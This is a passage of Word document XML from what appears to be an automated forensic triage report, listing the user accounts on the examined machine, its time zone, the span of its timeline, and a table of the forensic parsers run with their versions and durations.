              <w:t>S-1-5-18 (24781), Administrator (21087), ricksanchez (15658), Admin (15606), mortysmith (15366), S-1-5-19 (3527), S-1-5-21-41211245-796119838-3940169921-1001 (2815), S-1-5-21-2232410529-1445159330-2725690660-1106 (2761), S-1-5-21-2232410529-1445159330-2725690660-1108 (1569), S-1-5-21-2232410529-1445159330-2725690660-500 (1256), systemprofile (1255), Default (635), S-1-5-20 (358), C137\DESKTOP-SDN1RPT$ (309), Public (246)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Machine time zone</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ActiveTimeBias = 420 min (UTC = local time + bias)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Time convention of the report</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>All times are UTC.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Available traces</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>847,322 timeline events, from 2001-01-01 00:00:00 to 2020-09-19 05:38:57.828520</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Collection and processing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>KAPE collection (!SANS_Triage target); parsing by recognized tools orchestrated by orchestrator.py; normalization into DuckDB by normalize.py; analysis by analyze.py following the playbook. The raw tool outputs are kept in C:\Sleuthline\cases\test04\parsed and every cited piece of evidence points to them.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="2835"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="3118"/>
        <w:gridCol w:w="850"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Job</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact / tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Tool and version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Duration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser - Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser - ShimCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Chainsaw - Sigma detections + Chainsaw rules</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw v2.17.1; chainsaw_mapping v2.17.1; sigma_rules_dir r2026-07-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>13 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect - Windows plugins (no secrets)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect dissect.target 3.25.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>171 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd - EVTX (maps)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>17 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Hayabusa - detections (all rules)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa v4.2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd - Jump Lists</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd - LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>logfileparser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser - $LogFile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser v2.0.0.53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>286 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $Boot</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1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $MFT</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5 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_sds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $Secure:$SDS</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0 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl.py - OneDrive logs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>warning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl branch main @ 9ad135ecf56c; python_odlpy branch main @ 9ad135ecf56c</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd - Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso_setupapi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso - setupapi.dev.log (USB)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>log2timeline plaso 20260720; psort plaso 20260720</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>9 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd - complementary batch (EMDMgmt, Active Setup, Print Monitors, BootExecute, PCA)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0; RECmd_ComplementBatch sha256 d65f8bcd7190b4d4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
